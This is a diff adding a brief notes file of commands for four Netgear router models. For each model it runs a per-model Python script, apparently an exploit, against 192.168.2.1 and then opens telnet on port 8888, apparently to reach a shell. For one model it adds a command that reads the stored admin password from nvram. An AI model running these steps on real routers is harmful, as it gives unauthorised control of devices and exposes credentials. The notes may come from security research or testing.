@@ -1,0 +1,22 @@
+R7000:
+telnet 192.168.2.1 8888
+python r7000.py 192.168.2.1
+telnet 192.168.2.1 8888
+nvram show | grep http_pass
+echo -n password123 | sha256sum
+
+WGR614v9:
+telnet 192.168.2.1 8888
+python wgr614v9.py 192.168.2.1
+telnet 192.168.2.1 8888
+
+DGN2200M:
+telnet 192.168.2.1 8888
+python dgn2200m.py 192.168.2.1
+telnet 192.168.2.1 8888
+
+WNDR3700v3:
+telnet 192.168.2.1 8888
+python wndr3700v3.py 192.168.2.1
+telnet 192.168.2.1 8888
+
